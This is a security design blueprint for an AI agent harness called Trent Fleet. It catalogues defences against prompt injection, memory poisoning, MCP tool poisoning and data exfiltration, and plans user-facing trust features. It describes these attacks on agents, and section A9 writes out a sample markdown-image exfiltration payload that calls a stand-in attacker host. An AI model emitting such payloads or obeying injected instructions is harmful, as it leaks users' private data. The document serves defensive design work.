# Trent Fleet — Security SOTA & Trust-UX Blueprint

**Date:** 2026-09-26 · **Author:** security-architect + product-designer pass (Stage 00 discovery)
**Positioning:** Trent Fleet is the *security-first* local agent harness. Two goals, both first-class:
(1) be the most secure harness by adopting the strongest current defenses; (2) go beyond on how
secure it makes the **user feel** — honestly, with no theater and no dark patterns.

This doc has two parts. **PART A** is the state-of-the-art defense catalog: each pattern with a
source and a concrete way to land it in the TypeScript harness as a *testable property*. **PART B**
is the trust-UX layer: buildable "feel-and-verify-safe" features, each mapped to a real backing
primitive already in `packages/trent-core/src` so it ships as fact, not mock.

Cross-cutting rule for every item below: **truth over reassurance.** A green badge must correspond
to an assertion a test proves; a receipt must never claim a control that was not enforced.

---

## PART A — State-of-the-art defenses to adopt

Convention: each item lists the **pattern**, **source(s)**, and **testable property** — an
invariant expressible as a unit/property test in this repo.

### A1. Dual-LLM / quarantined-LLM
- **Pattern.** A Privileged LLM never sees untrusted text; a Quarantined LLM processes untrusted
  content and returns only symbolic/structured values (handles), never free instructions, to the
  privileged planner. Untrusted output cannot become control flow.
- **Source.** Simon Willison, "The Dual LLM pattern for building AI assistants that can resist
  prompt injection" (Apr 2023, simonwillison.net/2023/Apr/25/dual-llm-pattern/).
- **Testable property.** Given a tool result tagged `untrusted`, the planner prompt contains only a
  reference token (e.g. `$VAR_7`) and never the raw bytes; a fuzz test that stuffs injection
  strings into quarantined output asserts none of those bytes ever appear in a privileged-model
  request payload. Backs onto the existing provenance tags (see A3).

### A2. CaMeL — capabilities for agent tool use
- **Pattern.** Extract control + data flow from the *trusted* user query into a program; untrusted
  data rides as capability-tagged values that can inform but never redirect execution. A
  deterministic interpreter enforces a security policy at each tool call using the capabilities
  attached to arguments (e.g. "this string is derived from a web page → may not be an email
  recipient"). Solves ~77% of AgentDojo tasks with provable security vs 84% undefended.
- **Source.** Debenedetti et al., "Defeating Prompt Injections by Design" (CaMeL), arXiv 2503.18813;
  Willison summary (simonwillison.net/2025/Apr/11/camel/).
- **Testable property.** Every tool argument carries a capability set; a policy predicate
  `canFlow(source, sink)` is pure and total. Property test: for all argument provenances, a value
  whose capability set includes `untrusted` is rejected at any sink marked `sensitive` (recipient,
  shell, file-write-outside-workspace) unless an explicit user capability is present. Maps directly
  onto `governance/policy-rules.ts` + `governance/provenance.ts`.

### A3. Provenance / taint tracking of untrusted content
- **Pattern.** Tag every tool result `trusted` / `untrusted` at the adapter boundary; taint
  accumulates per step; a write into shared/persistent state (memory, brain notes) made in a
  tainted step is *held* for approval, not silently written. Prevents trust-escalation (a child's
  summary laundering a web page's instruction) and memory poisoning.
- **Source.** CaMeL (A2); Willison lethal-trifecta writing; OWASP LLM06 (excessive agency).
- **Already in repo.** `governance/provenance.ts` — `UNTRUSTED_ADAPTERS = [web, browser, mcp,
  plugins, inbound]`, per-step accumulation, held memory writes, `skill_manage` refused outright.
- **Testable property.** For any step whose accumulated tags include `untrusted`, a `memory`/brain
  write returns `held` (not `written`) and names the originating adapters; `skill_manage` returns
  `refused`. `governance/provenance.test.ts` is the anchor — extend to assert the held record
  never contains the untrusted bytes.

### A4. Spotlighting / delimiting untrusted input
- **Pattern.** Mark untrusted spans so the model can separate them from instructions — three modes:
  delimiting (randomized fences), datamarking (interleaved sentinel token), encoding (base64/ROT13
  for high-capability models). Datamarking/encoding measurably beat naive delimiters.
- **Source.** Hines et al., "Defending Against Indirect Prompt Injection Attacks With Spotlighting,"
  Microsoft Research, arXiv 2403.14720; MSRC blog "How Microsoft defends against indirect prompt
  injection" (Jul 2025).
- **Testable property.** A `spotlight(text, mode)` function is deterministic and reversible-audit:
  test asserts every untrusted chunk in the final prompt is wrapped with the per-run random
  sentinel, the sentinel is ≥N bits of entropy, and no untrusted chunk escapes unmarked. Pairs with
  A3 tags so the marker is applied exactly to `untrusted` provenance.

### A5. Lethal-trifecta mitigation (break private-data + untrusted-content + exfiltration)
- **Pattern.** The dangerous combination is *access to private data* + *exposure to untrusted
  content* + *ability to communicate outbound*. Don't try to detect injection; make the three
  never co-exist in one un-gated step. If a step read untrusted content, its egress is constrained
  to non-exfiltration sinks (or requires approval); private-data reads taint the step for egress.
- **Source.** Willison, "The lethal trifecta for AI agents" (Jun 2025,
  simonwillison.net/2025/Jun/16/the-lethal-trifecta/).
- **Testable property.** Define `trifectaViolation(step)` = hasPrivateRead ∧ hasUntrustedRead ∧
  hasFreeEgress. Property test over synthetic step traces: any step satisfying all three is blocked
  or downgraded to a broker-only/allowlisted egress before dispatch. Enforced at the seam between
  `governance/provenance.ts` and `egress/EgressProxy.ts`.

### A6. Deterministic policy engine / OPA-style allow rules
- **Pattern.** The LLM proposes; a deterministic Policy Decision Point disposes. Rules live outside
  the model, are versioned, and are testable like code (Datalog/Rego semantics: total, terminating,
  same input → same decision). Default-deny.
- **Source.** Open Policy Agent (openpolicyagent.org); Permit.io "OPA for Protecting AI Agents";
  `@ai-sdk/policy-opa`.
- **Already in repo.** `governance/policy-rules.ts`, `policy-dispatch.ts`, `hardline.ts`,
  `deny-globs.ts`, `gate-config-schema.ts`. Trent already ships a deterministic gate chain.
- **Testable property.** `decide(call, policy)` is pure; golden-file tests pin decisions for a
  matrix of (tool, args, provenance, autonomy level). Property: no code path executes a tool whose
  policy decision is not `allow`; the hardline list is never overridable by config. `gate-chain.test.ts`
  is the anchor.

### A7. Capability-based tool tokens
- **Pattern.** Tools receive short-lived, narrowly-scoped, revocable capability tokens rather than
  ambient credentials. A token names exactly the operation and the resource it authorizes; the
  underlying secret is held elsewhere and swapped in only at the trust boundary.
- **Source.** Object-capability model (Miller et al.); CaMeL capability enforcement (A2).
- **Already in repo.** `egress/TokenManager.ts` + `TokenStorePort.ts` + `egress/CredentialBroker.ts`
  — sandbox holds an opaque `trent-proxy-*` token; the broker is the *single* function that can
  place a real secret in an outbound header; tokens are file-backed and revocable across restarts.
- **Testable property.** Grep-level and runtime invariant: the real provider secret string never
  appears outside `CredentialBroker`; revoking a token in one process denies the next request in
  an already-running proxy. `CredentialBroker.test.ts` + `TokenManager.test.ts` anchor this.

### A8. Egress allowlisting + DNS pinning against rebinding
- **Pattern.** All outbound traffic funnels through a TLS-intercepting proxy that (1) enforces a
  host allowlist on CONNECT *and* on the decrypted request, (2) refuses when no token resolves (no
  open-relay fallback), and (3) pins the resolved IP for the life of the connection so a second DNS
  answer can't swap in a rebind target (defense against DNS-rebinding to `169.254.169.254`/loopback).
- **Source.** OWASP SSRF / DNS-rebinding guidance; general egress-firewall practice.
- **Already in repo.** `egress/EgressProxy.ts` (double allowlist gate on `intercept_domains`, no
  unauthenticated forward), `egress/host-binding.ts` (label-boundary subdomain matching; IP
  literals exact). **Gap to close:** add explicit resolve-once IP pinning + block of link-local /
  private ranges for public hostnames.
- **Testable property.** For a hostname that first resolves public then resolves to `127.0.0.1`,
  the connection uses the pinned first address; requests to non-allowlisted hosts get `403
  host_not_allowlisted` at both CONNECT and request layers. Anchor: `EgressProxy.host-binding.test.ts`.

### A9. Content security for markdown / image rendering
- **Pattern.** Model/tool output rendered in a TUI or webview must not be an exfiltration channel.
  Auto-loading a markdown image (`![](https://attacker/?data=SECRET)`) leaks data on render; links
  and HTML can smuggle instructions. Neutralize: don't auto-fetch remote images, strip/upgrade
  active content, route any render-time fetch through the egress allowlist (A8), and datamark
  untrusted rendered spans (A4).
- **Source.** Willison on markdown-image exfiltration in LLM apps; OWASP LLM02 (insecure output
  handling).
- **Testable property.** A `renderSafe(markdown)` pass yields zero network fetches for untrusted
  content (assert no egress events during render), and remote-image URLs are inert unless the host
  is allowlisted. Would live beside `tools/vision` / TUI render; new test module.

### A10. MCP tool-description pinning & signing
- **Pattern.** MCP tool descriptions are unsigned free text authored by strangers — the substrate
  for tool-poisoning (OWASP MCP03:2025), rug-pulls (CVE-2025-54136), and tool-shadowing. Pin the
  hash of each approved tool's full manifest (name + description + schema) on first approval; on
  every reconnect, re-hash and *re-approve* on any drift; treat descriptions as `untrusted`
  provenance (already true via A3).
- **Source.** Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks" (Apr 2025); OWASP
  MCP Top 10; CVE-2025-54136 (rug-pull).
- **Already in repo.** `governance/provenance.ts` classes `mcp`/`plugins` as untrusted;
  `hooks/consent.ts` is the exact precedent for hash-pinned consent (`hookSpecHash` over the exact
  spec; consent evaporates on any change).
- **Testable property.** `mcpToolHash(manifest)` is canonical (key order irrelevant, any value
  change flips it); a reconnect where a description changed returns `needs_reapproval` and the tool
  is not callable until re-consented. Mirror `hooks/consent.test.ts`.

### A11. Reproducible / signed builds (SLSA)
- **Pattern.** Prove the shipped binary came from the reviewed source via signed build provenance:
  hermetic build, ephemeral builder, cryptographically signed attestation (SLSA Build L3), verified
  at install/update time. Keyless signing via Sigstore/cosign with OIDC identity.
- **Source.** slsa.dev (v1.2, Nov 2025, Build track L0–L3 + Source track); Sigstore/cosign.
- **Already in repo (adjacent).** `updater/` performs update flows; `doctor/checks/dependencies.ts`.
  **Gap:** attach + verify SLSA provenance in the updater.
- **Testable property.** The updater refuses an artifact whose cosign signature or SLSA provenance
  fails to verify against the pinned builder identity; a tampered artifact test asserts `rejected`.

### A12. Local secret storage (OS keychain vs plaintext)
- **Pattern.** Secrets belong in the OS credential store (macOS Data Protection Keychain backed by
  the Secure Enclave; libsecret on Linux; DPAPI on Windows), not plaintext config. Where a file
  fallback is unavoidable, it is `0600` in a `0700` dir and the security audit flags any credential
  that ended up in `config.yaml`.
- **Source.** Apple Keychain / Data Protection Keychain guidance; MITRE ATT&CK T1555.001 (why
  plaintext stores are a target).
- **Already in repo.** Profile secrets file + `0600` discipline; `telemetry/redact.ts` is the single
  secret-shape definition; `governance/security-audit.ts` scans `config.yaml` for stray creds
  (names the key + line, never the value). **Gap:** optional keychain-backed `TokenStorePort`.
- **Testable property.** A keychain-backed store round-trips a secret without ever writing it to
  disk (assert no plaintext on the filesystem); the config-credential scanner flags a planted key
  and emits only its name, never its bytes. Anchor: `governance/security-audit.ts` findings + `redact.test.ts`.

### A13. Human-approval design that resists fatigue
- **Pattern.** Approvals must be rare, high-signal, batched, and bound to the *exact* action.
  Anti-patterns: endless modal prompts users learn to click through (habituation). Enforce a
  class-floor (only genuinely side-effectful/irreversible calls prompt), bind an approval to the
  specific call hash so a granted "yes" can't be replayed onto a different action, and show
  consequences + a one-line "why."
- **Source.** NN/G "User Education Is Not the Answer to Security Problems"; NN/G "Alert Fatigue in
  User Interfaces."
- **Already in repo.** `governance/bound-approvals.ts` (per-call approval binding),
  `governance/gate-config-schema.ts` (class floor), `governance/auto-review.ts` (an auto-reviewer
  decides low-risk held calls so humans see fewer), `heartbeat/quiet-hours.ts`.
- **Testable property.** An approval token is valid only for the call whose hash it was minted
  against (replay onto a different call → `rejected`); with auto-review on, the count of prompts
  surfaced to a human is strictly ≤ the count of side-effectful calls. Anchor: `bound-approvals.test.ts`.

### A14. Signed, append-only, tamper-evident audit trail
- **Pattern.** Every consequential action lands in a hash-chained log; exports are Ed25519-signed
  over the file digest and verifiable *offline* with only the file, its `.sig`, and the public key
  — no database, no network. A broken chain or a bad signature is detectable by anyone.
- **Source.** Standard tamper-evident logging (hash chaining / Merkle); Sigstore transparency-log
  design as precedent.
- **Already in repo.** `audit/signing.ts` (Ed25519 key at `<profile>/keys/audit.key`, `0600`),
  `audit/export.ts` (NDJSON chain + detached `.sig`), `audit/verify.ts` (re-walks the chain with no
  DB). CLI: `trent audit export|verify|key`.
- **Testable property.** `verify(file, sig, pub)` returns `ok` for an untouched export and `fail`
  for any single-byte edit or reordered row; the private key never leaves `signing.ts` as anything
  but a signature. Anchor: `audit/signing.test.ts`.

---

## PART B — The "feel secure" layer (trust UX)

Design contract for every feature: **what the user sees**, **the CLI/TUI surface** it lives on,
**the security fact it truthfully reflects**, and **the backing primitive** (so it is real). No
green light without a passing invariant behind it. No fear-marketing, no fake progress bars.

### B1. Security posture dashboard + letter grade
- **See.** `trent security` prints a posture card: an overall letter grade (A–F) computed from the
  section findings, then each section (autonomy, deny-globs/hardline, hooks+consent, egress+sandbox,
  workspace trust, redaction, MCP servers, plugins, audit chain, profile file modes, config-cred
  scan) with pass/finding and a one-line fix. Exits non-zero on any finding so CI can gate.
- **Surface.** `trent security audit [workspace]` (read-only); TUI posture widget in the status bar.
- **Truth reflected.** The grade is a pure function of real findings from `auditProfileSecurity` —
  never a vibe. Downgrade on any critical/high finding; no manual override of the grade.
- **Backing primitive.** REAL — `apps/cli/src/commands/groups/security.ts` +
  `governance/security-audit.ts` (`SECURITY_SECTION_IDS`, severity-sorted findings). *Add:* the
  letter-grade rollup on top of existing findings.

### B2. Per-run "security receipt"
- **See.** At the end of a run: what it read, which hosts it reached, what was **blocked**, and what
  secrets were **brokered but never seen** by the model (e.g. "Stripe key: brokered to api.stripe.com,
  value never entered the model context"). One screen, plain language.
- **Surface.** `trent run` footer + `trent run-output <id> --receipt`.
- **Truth reflected.** Every line comes from actual dispatch/egress events, not a plan. "Brokered,
  never seen" is provable because only `CredentialBroker` can inject the secret.
- **Backing primitive.** REAL — compose `egress/EgressProxy.ts` events, `CredentialBroker.ts`
  swaps, `governance/provenance.ts` tags, `telemetry/session-export.ts`. *Add:* a receipt assembler.

### B3. Live egress ledger
- **See.** A streaming panel while the agent runs: each outbound host, allowed/blocked, bytes, and
  whether a secret was brokered — appearing in real time so the user watches where traffic goes.
- **Surface.** TUI side panel; `trent security egress --follow` (tail).
- **Truth reflected.** Sourced from the proxy's own allow/deny decisions; a blocked host shows the
  `host_not_allowlisted` reason verbatim.
- **Backing primitive.** REAL — `egress/EgressProxy.ts` emits per-request decisions; `provider-hosts.ts`
  for host labels. *Add:* an event stream/tap the TUI subscribes to.

### B4. "Explain why this was blocked"
- **See.** When a call is denied, an inline, specific reason: which rule fired (deny-glob, hardline,
  allowlist, trifecta, tainted-write hold), the offending value (redacted), and the exact fix.
- **Surface.** Inline in the run transcript; `trent security explain <event-id>`.
- **Truth reflected.** The message is the policy engine's own decision record, not a guess — same
  determinism as the gate that blocked it.
- **Backing primitive.** REAL — `governance/policy-dispatch.ts` / `deny-globs.ts` / `hardline.ts`
  already produce structured refusals; `security.ts` render already prints `fix` lines.

### B5. Pre-flight "will do X, Y — not Z — proceed?"
- **See.** Before an autonomous run: a summary of what this run *will be allowed* to touch (hosts,
  file scopes, side-effect classes) and what it will *not*, with a single proceed/deny.
- **Surface.** `trent run --preflight` (dry-run planner); TUI confirm card.
- **Truth reflected.** Built from the actual policy + allowlist that will govern the run, so the
  summary is the enforced envelope, not marketing copy. Trent already ships `--dry-run` across
  commands ("would audit…", "would revoke…").
- **Backing primitive.** REAL — dry-run scaffolding in every command group + `gate-config-schema.ts`
  (class floor) + `egress` allowlist. *Add:* a preflight envelope renderer.

### B6. Panic / kill + "revoke all pairings"
- **See.** One command halts every running agent, revokes all inbound pairings (so no comment/DM/
  SMS can trigger a new run), and invalidates brokered egress tokens. Confirms exactly what was
  revoked.
- **Surface.** `trent panic` (new umbrella) wrapping `trent gateway revoke` (per-pairing today),
  token revocation, and service stop.
- **Truth reflected.** Pairings are the real default-deny inbound gate; revoking them genuinely
  stops inbound triggers, and token revocation genuinely denies the next brokered request.
- **Backing primitive.** REAL parts — `gateway-pair.ts` `revoke` + `PairingManager.revoke`,
  `egress/TokenManager` revocation, `service`/`heartbeat` stop. *Add:* the single `panic` umbrella
  and an "revoke ALL pairings" batch over the per-sender revoke that exists now.

### B7. Signed, offline-verifiable audit trail
- **See.** "Export a tamper-evident record of everything this agent did — verify it on any machine,
  offline, with just the file and our public key." Verification prints a clear ok/fail and the
  signer fingerprint.
- **Surface.** `trent audit export` / `trent audit verify <file>` / `trent audit key`.
- **Truth reflected.** Ed25519 signature over the hash-chained NDJSON; a single altered byte fails
  verification; the private key never leaves the profile.
- **Backing primitive.** REAL — `audit/signing.ts`, `audit/export.ts`, `audit/verify.ts`,
  `apps/cli/src/commands/groups/audit.ts`. Ships today.

### B8. "Paranoid mode" preset
- **See.** One switch that ratchets everything to strictest: autonomy off (approve everything
  side-effectful), egress allowlist minimal, MCP/plugins require re-approval, memory writes always
  held, quiet hours enforced. The card shows exactly which knobs moved.
- **Surface.** `trent security preset paranoid` (writes config) + `trent security` shows the active
  preset and its deltas.
- **Truth reflected.** It only sets real, individually-enforced controls — the preset is a bundle
  of settings the gate chain already honors, not a separate "mode" that pretends.
- **Backing primitive.** REAL knobs — `governance/autonomy.ts`, `gate-config-schema.ts`,
  `egress` config, `provenance.ts` hold behavior, `heartbeat/quiet-hours.ts`. *Add:* the named
  preset + delta printer.

### B9. First-run security posture wizard
- **See.** On first launch, a short guided setup: pick an autonomy level, choose an egress allowlist
  starting point, connect secrets to the keychain, generate the audit key — each step stating the
  concrete protection it turns on. Ends by running `trent security` so the user sees their grade.
- **Surface.** `trent setup` / interactive TUI wizard; ends in the B1 posture card.
- **Truth reflected.** Every choice maps to a real control and is immediately reflected in the
  posture audit — the wizard can't claim a protection the audit won't confirm.
- **Backing primitive.** REAL — `setup/` module, `doctor/DoctorRunner.ts` (checks to green), audit
  key gen in `audit/signing.ts`, then `security-audit.ts`. *Add:* wizard flow tying them together.

### B10. Diff of "what changed in my security config"
- **See.** "Since you last looked, these security settings changed: autonomy raised, host added to
  allowlist, a new MCP server approved." Shows before → after and who/what changed it (a `config set`
  the model requested is flagged).
- **Surface.** `trent security diff [--since <ref>]`.
- **Truth reflected.** Derived from the signed audit chain's config-change entries — tamper-evident
  provenance of the change itself, not a self-reported memory.
- **Backing primitive.** REAL — audit chain (`audit/`) records config actions; `config/` holds the
  schema. *Add:* a diff view over audit rows of type config-change.

### B11. Verifiable offline mode ("prove nothing left this machine")
- **See.** A mode where all egress is denied by default and the run's receipt/ledger can *prove* the
  network was untouched: "0 outbound connections; egress proxy denied N attempts." The user can
  verify against the signed audit trail.
- **Surface.** `trent run --offline`; posture card shows "offline: enforced" with the egress count.
- **Truth reflected.** The proxy is the only sanctioned egress path and it logs every attempt; a
  zero-allow policy plus a signed ledger of zero allowed connections is genuine evidence, not a
  promise. (Caveat honestly surfaced: this proves the *proxied* path is clean; full network
  isolation is the sandbox's job — see `SandboxEnvironment.ts`.)
- **Backing primitive.** REAL — `egress/EgressProxy.ts` (deny-all allowlist), `egress/SandboxEnvironment.ts`,
  audit chain for the signed count. *Add:* the `--offline` policy shortcut + count assertion.

### B12. "Brokered, never seen" secret indicator
- **See.** Anywhere a credential is used, a badge: "value brokered at the boundary — never entered
  the model's context or the transcript." Hover/expand shows which host it was bound to.
- **Surface.** Inline in transcript + in the B2 receipt; `trent connect status` (shows scopes/expiry,
  never values).
- **Truth reflected.** True by construction: only `CredentialBroker` injects the secret, bound to
  specific hosts via `host-binding.ts`; `telemetry/redact.ts` guarantees it can't appear in logs/
  exports.
- **Backing primitive.** REAL — `egress/CredentialBroker.ts`, `egress/host-binding.ts`,
  `telemetry/redact.ts`, `connect.ts` (`status` prints scopes/expiry, never a value).

### B13. Provenance/taint badge + held-write review queue
- **See.** Untrusted content (web/MCP/inbox) is visibly marked in the transcript ("from the open
  internet — treated as data, not instructions"). When a tainted step tries to write memory, it goes
  to a review queue the user clears deliberately, with the source named.
- **Surface.** Taint badges in the TUI transcript; `trent approvals list` / `approve` / `reject`.
- **Truth reflected.** The badge is the actual provenance tag that governs enforcement; the held
  write is genuinely not persisted until approved (memory-poisoning defense, A3).
- **Backing primitive.** REAL — `governance/provenance.ts`, `apps/cli/src/commands/groups/approvals.ts`
  ("held memory writes… and what the auto reviewer decided"), `governance/auto-review.ts`.

### B14. Hook/consent trust ledger ("what code runs on your tool calls")
- **See.** A plain list of every hook/automation configured to run on tool calls, whether it's
  consented, and a warning that any hook is arbitrary code from a config file. Changing a hook
  revokes consent until re-granted.
- **Surface.** `trent hooks` (list + consent); posture card section.
- **Truth reflected.** Consent is keyed to a hash of the *exact* spec (argv, timeout, match); a hook
  whose consent hash doesn't match never runs and the run says so — no silent execution.
- **Backing primitive.** REAL — `hooks/consent.ts` (`hookSpecHash`, `hooks-consent.json` `0600`),
  `apps/cli/src/commands/groups/hooks.ts`.

---

## Sources
- Willison — Dual LLM pattern: https://simonwillison.net/2023/Apr/25/dual-llm-pattern/
- Willison — Lethal trifecta: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Willison — CaMeL: https://simonwillison.net/2025/Apr/11/camel/
- Debenedetti et al. — "Defeating Prompt Injections by Design" (CaMeL): https://arxiv.org/abs/2503.18813
- Beurer-Kellner et al. — "Design Patterns for Securing LLM Agents against Prompt Injections" (Jun 2025)
- Hines et al. — Spotlighting: https://arxiv.org/pdf/2403.14720 ; MSRC: https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
- Open Policy Agent: https://www.openpolicyagent.org/ ; Permit.io: https://www.permit.io/blog/opa-for-protecting-ai-agents-and-agentic-stacks
- Invariant Labs — MCP Tool Poisoning: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks ; CVE-2025-54136 rug-pull: https://www.practical-devsecops.com/glossary/rug-pull-attack-in-mcp/
- SLSA: https://slsa.dev/ ; Sigstore/cosign supply-chain signing
- Apple Keychain / Data Protection Keychain; MITRE ATT&CK T1555.001: https://attack.mitre.org/techniques/T1555/001/
- NN/G — "User Education Is Not the Answer to Security Problems": https://www.nngroup.com/articles/security-and-user-education/ ; NN/G — Alert Fatigue in User Interfaces
- OWASP Top 10 for LLM Applications (LLM01 prompt injection, LLM02 insecure output handling, LLM06 excessive agency); OWASP MCP Top 10 (MCP03:2025 tool poisoning)
